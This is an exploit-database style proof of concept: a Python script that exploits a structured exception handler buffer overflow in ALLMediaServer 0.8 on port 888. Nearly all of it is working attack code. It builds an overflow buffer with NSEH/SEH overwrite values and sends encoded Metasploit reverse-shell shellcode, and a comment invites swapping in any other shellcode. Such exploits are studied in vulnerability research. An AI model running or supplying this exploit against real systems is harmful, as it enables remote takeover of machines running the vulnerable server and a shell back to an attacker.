# Exploit Title: seh exploit, BOF 
# Date: 04/07/2012
# Exploit Author: motaz reda 
# my E-mail:  motazkhodair@gmail.com
# Software Link: http://allmediaserver.org/
# Version: ALLMediaServer 0.8
# Tested On: Windows 7 ultimate
################################################

#!/usr/bin/python

import sys, socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((sys.argv[1], 888))

buffer = "A" * 1072

buffer += "\xeb\x06\x90\x90"   #NSEH  jmp short 6

buffer += "\xca\x24\xec\x65"   # SEH  POP POP RETN

# msfpayload windows/shell_reverse_tcp 
# you can replace the shellcode with any shellcode u want

buffer += ("\xd9\xc8\xd9\x74\x24\xf4\xb8\xa6\xaa\xb6\xad\x5b\x2b\xc9\xb1"
"\x4f\x83\xeb\xfc\x31\x43\x15\x03\x43\x15\x44\x5f\x4a\x45\x01"
"\xa0\xb3\x96\x71\x28\x56\xa7\xa3\x4e\x12\x9a\x73\x04\x76\x17"
"\xf8\x48\x63\xac\x8c\x44\x84\x05\x3a\xb3\xab\x96\x8b\x7b\x67"
"\x54\x8a\x07\x7a\x89\x6c\x39\xb5\xdc\x6d\x7e\xa8\x2f\x3f\xd7"
"\xa6\x82\xaf\x5c\xfa\x1e\xce\xb2\x70\x1e\xa8\xb7\x47\xeb\x02"
"\xb9\x97\x44\x19\xf1\x0f\xee\x45\x22\x31\x23\x96\x1e\x78\x48"
"\x6c\xd4\x7b\x98\xbd\x15\x4a\xe4\x11\x28\x62\xe9\x68\x6c\x45"
"\x12\x1f\x86\xb5\xaf\x27\x5d\xc7\x6b\xa2\x40\x6f\xff\x14\xa1"
"\x91\x2c\xc2\x22\x9d\x99\x81\x6d\x82\x1c\x46\x06\xbe\x95\x69"
"\xc9\x36\xed\x4d\xcd\x13\xb5\xec\x54\xfe\x18\x11\x86\xa6\xc5"
"\xb7\xcc\x45\x11\xc1\x8e\x01\xd6\xff\x30\xd2\x70\x88\x43\xe0"
"\xdf\x22\xcc\x48\x97\xec\x0b\xae\x82\x48\x83\x51\x2d\xa8\x8d"
"\x95\x79\xf8\xa5\x3c\x02\x93\x35\xc0\xd7\x33\x66\x6e\x88\xf3"
"\xd6\xce\x78\x9b\x3c\xc1\xa7\xbb\x3e\x0b\xde\xfc\xa9\x74\x49"
"\x03\x3e\x1d\x88\x03\x2f\x81\x05\xe5\x25\x29\x40\xbe\xd1\xd0"
"\xc9\x34\x43\x1c\xc4\xdc\xe0\x8f\x83\x1c\x6e\xac\x1b\x4b\x27"
"\x02\x52\x19\xd5\x3d\xcc\x3f\x24\xdb\x37\xfb\xf3\x18\xb9\x02"
"\x71\x24\x9d\x14\x4f\xa5\x99\x40\x1f\xf0\x77\x3e\xd9\xaa\x39"
"\xe8\xb3\x01\x90\x7c\x45\x6a\x23\xfa\x4a\xa7\xd5\xe2\xfb\x1e"
"\xa0\x1d\x33\xf7\x24\x66\x29\x67\xca\xbd\xe9\x97\x81\x9f\x58"
"\x30\x4c\x4a\xd9\x5d\x6f\xa1\x1e\x58\xec\x43\xdf\x9f\xec\x26"
"\xda\xe4\xaa\xdb\x96\x75\x5f\xdb\x05\x75\x4a")

s.send(buffer)

s.close()
